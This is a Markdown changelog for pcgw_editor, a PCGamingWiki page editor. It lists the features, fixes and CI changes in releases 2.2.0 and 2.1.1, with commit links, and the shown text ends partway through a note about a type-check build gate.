# Changelog

<a name="2.2.0"></a>
## [2.2.0](https://github.com/maicol07/pcgw_editor/compare/2.1.1...2.2.0)

> Released on November 17, 2026

### ✨ Features

- [`5b063b0`](https://github.com/maicol07/pcgw_editor/commit/5b063b00309813c598241e0079be517b86a3be4c) Implement section deletion functionality including WikitextParser support and UI integration for sections
- [`bcb69d2`](https://github.com/maicol07/pcgw_editor/commit/bcb69d2c7ddf315e5a57a260d8b44ff962a9be85) Implement custom syntax highlighting for Wikitext in both light and dark modes
- [`e9ba098`](https://github.com/maicol07/pcgw_editor/commit/e9ba098cce1ef86445374caf17d8e3b610ef5534) Add settings to toggle wikitext syntax highlighting in editor and diff views
- [`7f524e2`](https://github.com/maicol07/pcgw_editor/commit/7f524e2c1cfe66d44c10862f7e934e89de26181c) Reorder Localizations and System Requirements sections in the sidebar and UI layout
- [`a3d891a`](https://github.com/maicol07/pcgw_editor/commit/a3d891ab9fcd0e4a5cf47ec8ebc9ec21a55b5ece) Add functionality to duplicate platform rows and individual paths in GameDataPathForm
- [`e7af361`](https://github.com/maicol07/pcgw_editor/commit/e7af36155987a782e23218c4ece8793f79b8d0b7) Implement persistent row and path identification to enable smooth layout transitions
- [`25c2942`](https://github.com/maicol07/pcgw_editor/commit/25c294214f3ea33ca596df93be4b5d49697635a0) Implement section-level wikitext code mode toggle and sync support
- [`893094b`](https://github.com/maicol07/pcgw_editor/commit/893094bf778c24906992e30314f3a5ef0d4c8f76) Implement Google Drive offline access flow using Cloudflare Worker for token exchange and refresh
- [`b86adce`](https://github.com/maicol07/pcgw_editor/commit/b86adce6f1d9567bfe5f2678299054636ccf3f20) Add gallery image movement logic and standardize gallery section keys
- [`db7d405`](https://github.com/maicol07/pcgw_editor/commit/db7d405e82c9dae288213e2b7d4a22d3769406cc) Add support for AI usage fields and AI note references
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/3cccc2a506718d831f60f025823b9d4bea0783c4"><code>3cccc2a</code></a> Improve three-way merge functionality and editor integration</summary>

  > - Introduced new state management for merges with enhanced resolution tracking.
  > - Updated editor UI for more intuitive conflict resolution and manual edits.
  > - Added unit tests for merge logic, conflict handling, and history operations.
  > - Optimized CodeMirror integration with real-time updates and merge history.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/ecaa940c07ed17774c1563d9232f0d04f34498a6"><code>ecaa940</code></a> ✨ allow renaming files in the crop dialog</summary>

  > - Seed the filename from the original name for each queued crop job.
  > - Apply the edited base name with the extension of the selected format.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/4c42d697029ada9f7f05a21fcdfa781c43990a0f"><code>4c42d69</code></a> ✨ support drag-and-drop uploads in gallery and image combiner</summary>

  > - Drop images on the gallery section or the combiner queue.
  > - Skip non-image and oversized files with a warning toast.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/2f3d7f52fb02d0764d3b7fb38a710e2ab431d97f"><code>2f3d7f5</code></a> ✨ streamline localization rows and rich notes</summary>

  > Use matching selects for UI, audio, and subtitles. Add a compact rich-notes action and responsive row layouts with labeled controls. Verify rich-note and interface values round-trip through wikitext.

  </details>

### 🐛 Bug Fixes

- [`361eea7`](https://github.com/maicol07/pcgw_editor/commit/361eea7f9a69111917f100e819f323981d74ea1d) 💄 enlarge crop dialog with viewport-relative cropper height
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/10e3c24b7d1bcab822f8168ecf15ac782a3793f5"><code>10e3c24</code></a> 🐛 persist localization field and row changes</summary>

  > Propagate localization updates through schema fields, preserve row identity, and clear serialized rows when the list becomes empty. Add regression coverage for field edits and row operations.

  </details>

### ⚡ Performance Improvements

- [`f5ae9cf`](https://github.com/maicol07/pcgw_editor/commit/f5ae9cfc90f7f585e4a0089ccff5fcc0a5e7d1cd) Optimize image cropping with OffscreenCanvas, resource management, and debounced previews

### ♻️ Code Refactoring

- [`6c08aa8`](https://github.com/maicol07/pcgw_editor/commit/6c08aa88a6e7be32ae0fce894cf746b49268ad75) Move platform and path management actions into popup menus
- [`2aef47f`](https://github.com/maicol07/pcgw_editor/commit/2aef47fa9065b6300b979cbda0b8525e98eb7a26) Replace custom multi-input segment logic with a contenteditable-based editor implementation
- [`7da6139`](https://github.com/maicol07/pcgw_editor/commit/7da6139467f95a925f2d7455ea06393d26d5219f) Change primary template start index variable to constant
- [`e86d498`](https://github.com/maicol07/pcgw_editor/commit/e86d49898c05dcb859f6b3da75584e08e730f458) Improve MediaWiki API request handling, standardize POST requests, and remove unused gallery icon logic

### 📝 Docs changes

- [`ed5cd9d`](https://github.com/maicol07/pcgw_editor/commit/ed5cd9d5f519c8f382ed21e45e2ebf121bcccc64) Docs: 📝 add AGENTS.md for PCGW Editor guidelines and conventions

### ✅ Tests

- [`9baa666`](https://github.com/maicol07/pcgw_editor/commit/9baa6667fae5c0dba802702161920003f8de6d91) Update Automatic Session Refresh toggle selector and refactor assertion in AppSettings tests

### 👷 Building scripts changes

- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/4802aa6d74e90224846bea98a2c301d3f8e5fd8a"><code>4802aa6</code></a> 🔧 update deployment configuration to use Bun instead of pnpm</summary>

  > - Switched from pnpm to Bun for dependency management and build processes.
  > - Updated installation commands in deploy.yml, README.md, ci.yml, and package.json.
  > - Removed pnpm workspace configuration as it is no longer needed.

  </details>

### 👷 CI changes

- [`0b5fbdb`](https://github.com/maicol07/pcgw_editor/commit/0b5fbdb03585068264f2e9d60a0a2bd8b6e981e5) 👷 move the CI to the maicol07/actions reusable workflows
- [`9b94b7c`](https://github.com/maicol07/pcgw_editor/commit/9b94b7c19fa6a0b127024e49ffc00cd20f7a485d) 👷 add Dependabot updates
- [`7ac4db5`](https://github.com/maicol07/pcgw_editor/commit/7ac4db5486d5299ab1e1caa6198b80081dbba803) 👷 add the quality jobs
- [`7c6d53d`](https://github.com/maicol07/pcgw_editor/commit/7c6d53db5d00c569463689c0405de78ba311ddf6) 👷 move to maicol07/actions v2 and skip the checks on the release merge
- [`1b582cf`](https://github.com/maicol07/pcgw_editor/commit/1b582cf6ee5d943d9b9746696b217fee17586930) 👷 use the setup-js action of maicol07/actions v2
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/541d6261771831b4c0dd35e8955a98829813eb62"><code>541d626</code></a> 🐛 hold the release when a check was cancelled</summary>

  > !failure() is false only for failed needs: a cancelled check let the release run.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/270444bd7e46295a5dad9f3fa3aa810bcf4f1962"><code>270444b</code></a> 🐛 run the build and deploy jobs after a release merge</summary>

  > The checks skipped on the release merge made success() false for every job after release, so the tag was created but never built or deployed.

  </details>

<a name="2.1.1"></a>
## [2.1.1](https://github.com/maicol07/pcgw_editor/compare/1.9.1...2.1.1)

> Released on August 26, 2026

### ✨ Features

- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/bacdeb93960dc774684e81a2b015286e7b2610e9"><code>bacdeb9</code></a> <b>gallery:</b> Allow selecting custom output format in crop and combine tools</summary>

  > - Added PNG, JPEG, and WebP format selectors using PrimeVue Select.
  > - Implemented auto-detection of default format based on the original image (for crop) or majority frequency with a tiebreaker (for combine).
  > - Enabled automatic file name extension renaming (e.g., .png -> .jpg) on format change to prevent MIME mismatch.
  > - Added comprehensive unit tests covering extension resolution, renaming, majority/tiebreaker detection, and manual override locking.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/5dcfb6e6978eaefbc67ed4d4cf2496b23af37100"><code>5dcfb6e</code></a> <b>gallery:</b> Add 12.5 MP image validation, auto-resizing, and persistent warning cards</summary>

  > - Intercept single and batch uploads to validate the PCGW 12.5 Megapixel limit.
  > - Prompt users with an English warning dialog to auto-resize oversized files client-side via HTML Canvas, preserving aspect ratio and format.
  > - Add a persistent card warning banner ("Exceeds 12.5 MP") with a "Resize Image" button on oversized gallery items.
  > - Remove prompts from local addition, crop, and combine paths to keep the local workflow completely uninterrupted.
  > - Add comprehensive Vitest unit tests to cover reactive map detection and resizing behavior.

  </details>
- [`ff632b3`](https://github.com/maicol07/pcgw_editor/commit/ff632b336289ed618b9123848ad5d8de519e499e) Implement image proxying with batch metadata loading in gallery component
- [`64e8d79`](https://github.com/maicol07/pcgw_editor/commit/64e8d79704143237482fb1c81af84ed891de8ed4) Upgrade Gemini model from 3-flash-preview to 3.5-flash
- [`83ec1a5`](https://github.com/maicol07/pcgw_editor/commit/83ec1a5ade0bc3a5fd43493a82fdb781176f6fdc) Enable adding custom values to Autocomplete and MultiSelect fields via filter-driven UI buttons
- [`4463f52`](https://github.com/maicol07/pcgw_editor/commit/4463f52adcaf7d93dae7e43b4f0798a8060301eb) Add OS icons and integrate them into DLC and release date platform selectors
- [`8f558a6`](https://github.com/maicol07/pcgw_editor/commit/8f558a6917e7f18566095713b9f156f08eac1fad) Replace OS input text field with MultiSelect component in AvailabilityForm
- [`b32eda8`](https://github.com/maicol07/pcgw_editor/commit/b32eda8df2c55555cd937789d45f500a3b8e6e03) Convert Extra Keys field in AvailabilityForm to a MultiSelect with icons and aliases normalization
- [`fc40547`](https://github.com/maicol07/pcgw_editor/commit/fc4054706c3b6af4b53f9aaef544aa244d0dc87f) Update Store dropdown select options, add normalization and render storefront SVG icons with retail/dev/pub fallbacks
- [`da282ac`](https://github.com/maicol07/pcgw_editor/commit/da282ac2fd8e456606670c55e6f179a061192fac) Expand storefront options list and improve normalization logic
- [`ce444fe`](https://github.com/maicol07/pcgw_editor/commit/ce444fe513720f39a1a4b8a2b2aca21097fc667d) Update platform icons to support dynamic components and add specific icons for Amazon Games, PC booter, and DOS
- [`e644b7e`](https://github.com/maicol07/pcgw_editor/commit/e644b7ef57a8f386a6aeedd310f75985999ca1a3) Implement initial suggestions loading and UI improvements for AutocompleteField component
- [`9b78218`](https://github.com/maicol07/pcgw_editor/commit/9b782185918c9338c9031e0346f113e932cdc7a8) Implement batch revision checking for workspace pages to optimize API usage
- [`45b5acd`](https://github.com/maicol07/pcgw_editor/commit/45b5acdbbe45a0f0f28a558abce384820004c56d) Implement global API rate limiting state with UI notifications and automated request queuing
- [`3a727c4`](https://github.com/maicol07/pcgw_editor/commit/3a727c4e32775c5ebd27dd69280b1998fbccfe0f) Implement auto-relogin on CSRF token expiration and add isAuthReady check to media services
- [`a00436c`](https://github.com/maicol07/pcgw_editor/commit/a00436c8053478c159a0eea7bd02848a23181075) Auto-populate and disable IGDB field when present in reception and add unit tests
- [`d977f16`](https://github.com/maicol07/pcgw_editor/commit/d977f16332f01263e8e000363996b3d1ee7eead0) Escape <ref> tags during wikitext conversion to prevent removal by the editor
- [`3f318b9`](https://github.com/maicol07/pcgw_editor/commit/3f318b9a3d571b0a5f360501a8ffcc23e1e60e03) Add MetadataAutofillDialog with Gemini, IGDB, RAWG, and VNDB integration for game metadata extraction
- [`de918dd`](https://github.com/maicol07/pcgw_editor/commit/de918dd55df33a9f84c9c84375693091c71962bd) Remove ripple
- [`bf60516`](https://github.com/maicol07/pcgw_editor/commit/bf60516b67ffc5d36e5ce6228d3babb960297492) Implement scroll-spy section navigation rail in the visual editor
- [`0d361bb`](https://github.com/maicol07/pcgw_editor/commit/0d361bb0a01431f6366f55c6ea327a0ae0c0d8b7) Refactor UI to use collapsable sidebar navigation and flat cardless section layout
- [`3fc3c87`](https://github.com/maicol07/pcgw_editor/commit/3fc3c870ab734afd0eb1ff6eb835413f13cb9961) Overhaul sidebar UI with improved page listing, rename dialog, delete confirmation, and integrated import functionality
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/80b62dcc7e828877d729e6c95a83915d647e9466"><code>80b62dc</code></a> <b>forms:</b> Rating bulk actions, keyboard entry and two-column layout</summary>

  > Add a BulkRatingActions toolbar to set every rating in a panel at once, keyboard entry (T/F/L/U/H/N) with auto-advance and an inline notes preview on RatingRow, and lay out long rating lists in two columns on wide screens.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/6be9025e0f1c44e0adf097211ef9bc98aaafb32a"><code>6be9025</code></a> <b>infobox:</b> Duplicate detection, A-Z sort, autofill fallback and responsive grids</summary>

  > Flag duplicate release-date platforms and reception aggregators, add an A-Z sort for company/engine lists, show guidance when metadata autofill returns no results, and switch cover/companies grids to single-column on tablet.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/3623761fbbd3cc18b90f477b794f3730bf6457f5"><code>3623761</code></a> <b>store:</b> Availability, monetization and DLC entry improvements</summary>

  > Detect duplicate storefronts/DLC names, prefill DRM from the chosen store and surface the expected product-ID format, add an OS-from-game helper for DLC, and group monetization into primary vs secondary models.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/fd5e1311e5c3a0d18fdbc878b935b9331dcdfa70"><code>fd5e131</code></a> <b>sections:</b> Faster entry for system requirements, localizations, game data and issues</summary>

  > Add copy-from-minimum/from-Windows for system requirements, bulk-add common languages and column set-all for localizations, special-path token picker and env-var hints for game data, issue status + templates, list count badge and row duplication.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/322a902ecff537c61a92bc924b44086aa4f70ab5"><code>322a902</code></a> <b>editor:</b> Responsive shell layout and section navigation</summary>

  > Stack the editor/preview split vertically below lg and persist its ratio, widen content on ultra-wide screens, make the preview scroll wide content, clarify the sticky search bar, add clickable stub-checklist navigation, and tidy label/grid layout across schema fields.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/bc2331257d2d51f80da384935be949ff1b4752a0"><code>bc23312</code></a> <b>references:</b> Copy citation and auto-fill date in the notes editor</summary>

  > Add a copy-citation action and default citation dates to today, with override.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/ae4191d2b8ac3351e9bf6c40543c84c759da8e5a"><code>ae4191d</code></a> <b>editor:</b> Add shared wiki render helpers</summary>

  > Pure helpers to turn the inline wiki tokens produced by the WYSIWYG toolbar
  > (citations, {{Key}}, interwiki links) and {{mm}} runs into their visual HTML,
  > plus balanced-aware splitArgs and an inline-markup renderer reused by the
  > converter and editor.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/68b6c8399553989f218c8b5283a601b82f4ed34a"><code>68b6c83</code></a> <b>editor:</b> Render wiki tokens, templates and {{mm}} lists in the converter</summary>

  > wikitextToHtml now turns citations ({{Refcheck}}/{{Refurl}}/{{cn}}/<ref>),
  > {{Key}}, {{u}}/{{t}} and interwiki links into atomic chips carrying their
  > verbatim source in data-wikitext, and renders {{mm}} runs as the PCGW
  > "more info" definition list. htmlToWikitext decodes those embeds back via
  > data-wikitext (DOM-based, robust against nested tags), so they round-trip
  > losslessly. Plain [[links]] and [url] stay native.
  >
  > Also fixes Fixbox rendering: parse with balanced braces so a nested
  > ref=<ref>{{Refcheck|...}}</ref> no longer truncates the box, and render the
  > reference as its real citation instead of raw template text.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/afb24069fdddf0e076a791ca0034dc296aa239d1"><code>afb2406</code></a> <b>editor:</b> Insert toolbar output as editable chips, with click-to-edit</summary>

  > The citation/link/formatting buttons now insert rendered embeds (inline
  > WikiTokenBlot, block MmListBlot, and Fixbox reworked to store its verbatim
  > wikitext) instead of raw wikitext. Clicking a chip or fixbox reopens its
  > dialog pre-filled and replaces it in place; clicks never follow the inner
  > link. Edit dialogs are titled "Edit ..." and a fixbox's existing reference
  > pre-populates its citation dialog (balanced parsing keeps nested refs intact).

  </details>
- [`d1f9891`](https://github.com/maicol07/pcgw_editor/commit/d1f98914e485f74fe6b7a3d3e72957f9d804757e) Add release notes dialog to display changelogs and notify users of new builds
- [`6a15f12`](https://github.com/maicol07/pcgw_editor/commit/6a15f12795d4e7504db3ce12457ee8187ac641da) Implement secure cloud synchronization using Google Drive and WebCrypto AES-GCM encryption
- [`2bb8ee4`](https://github.com/maicol07/pcgw_editor/commit/2bb8ee4b939e34c6998faaddbbcdc61529d2228d) Implement 3-way merge logic and UI components to resolve wikitext conflicts
- [`ded6437`](https://github.com/maicol07/pcgw_editor/commit/ded64372b0bf097ca39bb5da254e47b67eda4cda) Add collapsible filter menu to workspace sidebar
- [`0c0c6dd`](https://github.com/maicol07/pcgw_editor/commit/0c0c6dd2e906c74911c0b4819b6ebd46246197ed) Redesign Checkbox component as a toggle card with description and icon support
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/2d64a1a36330844dbf070c0788692b75d51b4aa6"><code>2d64a1a</code></a> <b>editor:</b> Full WYSIWYG chrome + shared snippet toolbar</summary>

  > Wrap the rich-text editor in a card with a header (title, description
  > tooltip, source toggle) and a footer with a live word/char count. Move
  > the source toggle into the header and drop the duplicated source-mode
  > title bar. Extract the citation/link/key/fixbox snippet buttons into a
  > shared EditorSnippetTools component used by both the WYSIWYG and source
  > toolbars (was duplicated markup). Fix text-[9px] labels -> text-2xs.
  >
  > DynamicField feeds the editor label/description/icon (and suppresses the
  > external label, now owned by the header), and falls back to a field's
  > description as input placeholder instead of echoing the label.
  >
  > Logic (Quill blots, wikitext round-trip, dialogs) untouched.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/ccd2c3a4daa0bcadd9a3196dc6d3bb926c803742"><code>ccd2c3a</code></a> <b>availability:</b> Header+body card rows with single-row header</summary>

  > Restructure each availability row into a card: a header strip with an
  > always-visible drag handle, the store selector, the state segmented
  > control and delete on one row, over a container-query body grid
  > (Product ID / DRM / OS, then keys / notes). Compact the state control
  > so store + state share the row. Add hover highlight, an empty state,
  > and a bottom full-width "Add Store" button (drops the redundant
  > "Availability Table" header).

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/754f5e7c5bef098e3e2365a46b8a6ce6d5540668"><code>754f5e7</code></a> <b>dlc:</b> Header+body card rows matching availability</summary>

  > Rework DLC/Expansion rows into the shared card pattern: header strip
  > with a visible drag handle, the name as the prominent input, and delete;
  > body holds OS (with "OS same as game") and notes, splitting to two
  > columns only when the panel is wide. Fix text-[11px] -> text-2xs.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/b04ea3fb2d6b42f5b7cf62e111882467a6066be1"><code>b04ea3f</code></a> <b>game-data:</b> Card rows, drag-to-reorder &amp; unified Add button</summary>

  > Turn each platform path group into a header+body card (platform select
  > + visible delete over the file-path list), matching availability/DLC.
  > Make rows drag-reorderable via VueDraggable + a visible handle, add a
  > hover highlight, and move "Add Platform" to a bottom full-width dashed
  > button. Remove a stray markdown fence at the end of GameDataForm.

  </details>
- [`2505fd4`](https://github.com/maicol07/pcgw_editor/commit/2505fd45b81d7eabe1b6ca875185ef9f3a602198) **sections:** Polish Introduction, Monetization & Essential Improvements
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/9667f17129430f7a250f6015476c08b0531ffcbd"><code>9667f17</code></a> <b>ui:</b> Refined-console restyle of the editor shell</summary>

  > Flat hairline surfaces, uppercase eyebrow section/group headers, blue
  > reserved for actions, and monospace data accents. Adds shared tokens
  > (surface-card, section-eyebrow, font-data); restyles the section
  > headers, splitter gutter, schema group cards (DynamicSection) into flat
  > eyebrow-led panels, and the AI screenshot card.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/8ba1b6a530024aa17d7ca0e82d813fa037ca22b4"><code>8ba1b6a</code></a> <b>sections:</b> Polish Audio, OS support, System Requirements, Localizations &amp; Issues</summary>

  > - Audio: enrich the API group with icons and explanatory tooltips
  > - OS support matrix: quiet hairline header instead of the solid blue bar
  > - System Requirements: flat surface card, tighter inner cards
  > - Localizations: eyebrow-style row labels
  > - Issues: remove the common-issue-templates picker (full-width Add Issue)
  > - Drop the redundant field labels on the custom sections

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/377a0c228c61dd5123563e5b2b9ca6aab40e64d0"><code>377a0c2</code></a> <b>gallery:</b> Flat restyle, refined dialogs, Image Combiner + auto-adjust</summary>

  > - Gallery and all dialogs (add image, caption, rename, edit/delete on
  >   PCGW) adopt the flat eyebrow language; filenames in mono; responsive
  >   dialog widths; redundant colored hero blocks removed
  > - Rename Layout Builder -> Image Combiner
  > - Add a no-AI smart Auto-adjust action that center-crops queued images
  >   to a uniform height (horizontal) or width (vertical) for a flush montage

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/1045fbdba3e5e388f626eb42769a88bc6724321b"><code>1045fbd</code></a> <b>autofill:</b> Redesign matches list and strip Metacritic slug prefix</summary>

  > - Pin the Compare & Merge action in an always-visible footer (it used to
  >   scroll out of view); add a selection count and clearer selected-row
  >   state; solid (non-glass) responsive dialog
  > - Automatically strip the 'game/pc/' (or bare 'game/') prefix from the
  >   Metacritic ID so it matches PCGW's reception parameter format

  </details>
- [`3b70976`](https://github.com/maicol07/pcgw_editor/commit/3b70976f5eef76be189f80c7b6f03459bc257575) Add @codemirror/commands dependency and update splitter styling selectors
- [`eebc07a`](https://github.com/maicol07/pcgw_editor/commit/eebc07a6f073820d95d2853abca39a8a770f8188) Persist Google Drive access token in local storage and implement automatic background refresh
- [`fda8bd7`](https://github.com/maicol07/pcgw_editor/commit/fda8bd7f9098e8652550fd7e7f3375229fa10492) Add interactive setup guides for RAWG and IGDB API credentials in App Settings
- [`7248f3b`](https://github.com/maicol07/pcgw_editor/commit/7248f3b16eb7836c1379455270ac2d912f2871a7) Add AI assistant provider setup documentation and help section to settings
- [`ea0b198`](https://github.com/maicol07/pcgw_editor/commit/ea0b198924687296d66a2a82586a245e472701f5) Implement empty workspace state with dashboard UI and page creation options
- [`5463f9c`](https://github.com/maicol07/pcgw_editor/commit/5463f9c2f7a90eb20d6903edf97893ef8b8d52b5) Implement interactive guided tour for new users
- [`4616c90`](https://github.com/maicol07/pcgw_editor/commit/4616c90546b0cd151a9d8815858fe84b5605a1d6) Implement manual sync reconnection flow and handle token expiry states
- [`c0f9671`](https://github.com/maicol07/pcgw_editor/commit/c0f96718e0979fac664160875a076ea232f33f4e) Separate tour finish and close actions and ensure tour progress persistence
- [`f21f732`](https://github.com/maicol07/pcgw_editor/commit/f21f732d68a0b46fa5e45084adcb340222fa313b) Add subtitle support to ModernPanel and introduce surface-panel utility for static layout containers
- [`ebcdfe7`](https://github.com/maicol07/pcgw_editor/commit/ebcdfe701edbbc2ce68745718889b2fc003a1737) Implement silent token refresh cooldown and add click-based sync trigger for disconnected states
- [`e7250bc`](https://github.com/maicol07/pcgw_editor/commit/e7250bc14a6ae16e52bee58762e96a695ee61f3e) Add combineConfig persistence to local files database and parser
- [`be1320f`](https://github.com/maicol07/pcgw_editor/commit/be1320ffa23ab67291403337ed9747dbe55569b1) Add Chuvash, Gothic, and Võro languages to LocalizationsForm with fallback flag icon support
- [`1ffe9b3`](https://github.com/maicol07/pcgw_editor/commit/1ffe9b3b7bc265c0831c56c7feeaae9491284045) Implement prewarmCargoInitialValues to cache taxonomy fields and common search queries from Cargo
- [`7190b6f`](https://github.com/maicol07/pcgw_editor/commit/7190b6f1468e7b4f34978a2c58f5e63c7e043f25) Add intelligent output filename suggestion, manual editing, and sanitization for image combination in SectionGallery
- [`e7bd6c0`](https://github.com/maicol07/pcgw_editor/commit/e7bd6c0307c1d463fa8993cf6e997e394e404164) Add force re-sync option to EditorToolbar and update handling in App component
- [`d034f26`](https://github.com/maicol07/pcgw_editor/commit/d034f26986abfd76f3da4c7e689bbc9a3cedb448) Add support for cropping gallery and combined images with undo/redo functionality
- [`0a203fa`](https://github.com/maicol07/pcgw_editor/commit/0a203fac64cb5c2943d761351b78bfb61a287196) Implement smooth grid-based panel transitions and add section keys to ModernPanel components
- [`4ed1d0b`](https://github.com/maicol07/pcgw_editor/commit/4ed1d0ba214bbb7dc78c8cdd25d92ba2c0ef3476) Add conflict navigation, enforce cache bypass for PCGW fetches, and update default merge resolution logic
- [`46b4fad`](https://github.com/maicol07/pcgw_editor/commit/46b4fad82636cd342dfb6f0c847130f3b1190819) Cache wikitext revisions in IndexedDB and implement opt-in 3-way merge resolution
- [`8dcc608`](https://github.com/maicol07/pcgw_editor/commit/8dcc608b79d10e28b98d669577063dad22231881) Implement optional password persistence for auto-relogin and include CSRF tokens in media uploads
- [`e2d38d2`](https://github.com/maicol07/pcgw_editor/commit/e2d38d281ef2743916385b81116eef2f4606e277) Implement token request deduplication and add 401 retry logic to Google Drive requests
- [`5cdbae9`](https://github.com/maicol07/pcgw_editor/commit/5cdbae9da6f491e0135bfe7223e8cb2101c1054b) Add CSS styles for MediaWiki gallery components to the preview stylesheet
- [`65ed43b`](https://github.com/maicol07/pcgw_editor/commit/65ed43b4437719049fa1fd46b14bf75da4abe023) Implement request deduplication and batching for image API calls to optimize network performance
- [`af3f077`](https://github.com/maicol07/pcgw_editor/commit/af3f07797f90b3f7ab2e84fd5ca33f9b8bacba68) Move raw environment variable token suggestions from PathInputField to GameDataPathForm
- [`d41b173`](https://github.com/maicol07/pcgw_editor/commit/d41b17323e73808902511e8094a7a309dd4eb93e) Implement dynamic AI model fetching and caching with support for live provider updates in AppSettings
- [`e498016`](https://github.com/maicol07/pcgw_editor/commit/e498016d06e27d98328dcb7bf45cb237edeb1ae9) Add AI provider logos to the settings dropdown
- [`7ee26e2`](https://github.com/maicol07/pcgw_editor/commit/7ee26e266c9b52bd2981d3027a46d4c19a38d6fe) Implement video analysis comparison and application workflow with unit tests
- [`af6c8b6`](https://github.com/maicol07/pcgw_editor/commit/af6c8b63db83add722c596e321e167c74f92cc39) Implement persistent IndexedDB storage for video analysis results and add view/delete functionality in VideoAnalysis component
- [`7181b65`](https://github.com/maicol07/pcgw_editor/commit/7181b65f268e15b28e17697870a01201db003379) Implement unified AI section analysis engine with IndexedDB persistence and automated diffing for game settings
- [`7be3bad`](https://github.com/maicol07/pcgw_editor/commit/7be3bad3051650b91a9961d54c00399c3264f5d1) Introduce AISummaryDialog, refactor AI configuration settings, and improve integration error flows
- [`e4f66ef`](https://github.com/maicol07/pcgw_editor/commit/e4f66efe8b99e9b24b71fd813e5b32a6cd5cfeff) Implement scroll synchronization between the code editor and preview panel using a new composable
- [`b21fe58`](https://github.com/maicol07/pcgw_editor/commit/b21fe58301b755653192313e48cfd0cb3fa90a41) Add hideAiFeatures toggle to disable AI components and services across the editor
- [`71b997e`](https://github.com/maicol07/pcgw_editor/commit/71b997e944eec1ea5823880f1455d4d11d4fc724) Add workspace backup functionality and configurable CodeMirror editor settings
- [`26cfd7c`](https://github.com/maicol07/pcgw_editor/commit/26cfd7c346bc783d39b87ef3eafe56614caa5295) Add permission denied notification handling and display authentication requirements in AutocompleteField

### 🐛 Bug Fixes

- [`00a3cad`](https://github.com/maicol07/pcgw_editor/commit/00a3cad79c52bef912b08ec6d46611967591c14d) Restore Games for Windows Live and Mac App Store icons in store mapping
- [`b889c1e`](https://github.com/maicol07/pcgw_editor/commit/b889c1eddb88b62058c0f050bb902e4a71265930) Remove hardcoded padding and update input classes to ensure autocomplete components fill container width
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/e410c73bac4cea46f914af37dd5dd1fcd6c1a51a"><code>e410c73</code></a> <b>editor:</b> Use the app font in WYSIWYG content and unclip the heading dropdown</summary>

  > The Quill content area (.ql-editor) now inherits the font selected in
  > settings via --app-font-family, and the heading picker's options get a
  > higher z-index so they layer correctly once the toolbar no longer clips them.

  </details>
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/423cb28445f86002f87c8477cda7aa3cbb94e462"><code>423cb28</code></a> <b>pwa:</b> Use brand blue (#337abe) for theme color</summary>

  > The manifest theme_color and the index.html theme-color metas carried
  > stale colors (#5b21b6 purple, #174e95). Align them to the brand blue and
  > drop the duplicate theme-color meta.

  </details>
- [`941d084`](https://github.com/maicol07/pcgw_editor/commit/941d0840061aeb5c4f5a33328587b15907e0e00e) Use X-HTTP-Method-Override to bypass CORS preflight issues with PATCH requests in Google Drive provider
- [`84e4463`](https://github.com/maicol07/pcgw_editor/commit/84e4463c34a365ed638d4bf7e2fad602a7d89779) Override browserslist to 4.28.4 to resolve corrupted tarball issue
- [`a093e25`](https://github.com/maicol07/pcgw_editor/commit/a093e2557d79efb57f8fe8d01109e55979ed5387) Allow blob: protocol in CSP connect-src directive
- [`fee12a5`](https://github.com/maicol07/pcgw_editor/commit/fee12a5ca92c6e6afd7cd76ba8e61749c723fc06) Prevent concurrent file uploads and maintain state consistency during dialog operations
- [`abfe5ae`](https://github.com/maicol07/pcgw_editor/commit/abfe5ae067e03c33b69d747aa62e761e76a0dc84) Monetization table query name
- [`97b79bd`](https://github.com/maicol07/pcgw_editor/commit/97b79bdd2c53c6b4cc79ae1a18ff10823a6ff290) Adjust IconField input padding to ensure proper icon alignment in sidebar search fields
- [`c961a6d`](https://github.com/maicol07/pcgw_editor/commit/c961a6d8df621d2ee4e0c40f1d591465aec70e06) Improve PCGamingWiki URL parsing to handle protocol-less links and www subdomains
- [`8e7a3c0`](https://github.com/maicol07/pcgw_editor/commit/8e7a3c0ff3af13acd48172be9f2dde45d70cc8e4) Resolve field key collisions in DynamicSection by generating unique identifiers based on field metadata and add unit test coverage
- [`ceae95b`](https://github.com/maicol07/pcgw_editor/commit/ceae95b916f4e172793ff3856aafe1882980b133) Preserve localId after file upload to enable immediate Local/PCGW switching functionality
- <details><summary><a href="https://github.com/maicol07/pcgw_editor/commit/ca3002d5658369fed74628af0851986e7159ed79"><code>ca3002d</code></a> The type check never ran — repair the build gate and fix 21 real errors</summary>

  > `pnpm build` ran `vue-tsc && vite build`, but tsconfig.json is a solution-style
  > config (`files: []` plus project references). Invoked with neither -b nor -p,
  > vue-tsc type-checks nothing and always exits 0. Proven by reintroducing an
  > undefined identifier in src/config/api.ts: still exit 0.
  >
